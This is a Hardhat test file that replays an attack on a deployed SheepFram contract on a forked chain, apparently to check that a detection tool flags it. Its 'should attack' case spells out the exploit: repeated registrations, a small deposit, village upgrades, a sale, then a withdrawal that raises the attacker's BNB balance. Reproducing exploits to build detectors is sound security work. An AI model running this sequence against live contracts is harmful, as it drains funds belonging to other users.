import { ethers } from 'hardhat'
import { SheepFram } from '../typechain-types'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'

describe('CCA Detects Sheep Fram Attack Test', async function () {
    let attacker: SignerWithAddress
    let sheepFram: SheepFram

    beforeEach(async () => {
        ;[attacker] = await ethers.getSigners()
        sheepFram = await ethers.getContractAt('SheepFram', '0x4726010da871f4b57b5031E3EA48Bde961F122aA')
    })

    it('should block number equal to 23088156', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(23088156)
    })

    it('should attack', async function () {
        let neighbor = await ethers.getAddress('0x14598f3a9f3042097486DC58C65780Daf3e3acFB')

        // Simulate registration
        for (let i = 0; i < 200; i++) {
            await sheepFram.connect(attacker).register(neighbor)
        }

        // Simulate adding gems
        await sheepFram.connect(attacker).addGems({ value: ethers.parseEther('0.05') })

        // Simulate upgrading the village
        for (let i = 0; i < 3; i++) {
            await sheepFram.connect(attacker).upgradeVillage(i)
        }

        // Simulate selling the village
        await sheepFram.connect(attacker).sellVillage()

        // Get the attacker's balance before the exploit
        const balanceBefore = await ethers.provider.getBalance(attacker.address)
        console.log('Attacker BNB balance before exploit:', ethers.formatEther(balanceBefore))

        // Simulate withdrawing money
        await sheepFram.connect(attacker).withdrawMoney(20000n)

        // Get the attacker's balance after the exploit
        const balanceAfter = await ethers.provider.getBalance(attacker.address)

        console.log('Attacker BNB balance after exploit:', ethers.formatEther(balanceAfter))

        // Check if the balance has increased as expected
        expect(balanceAfter).to.be.gt(balanceBefore)
    })
})
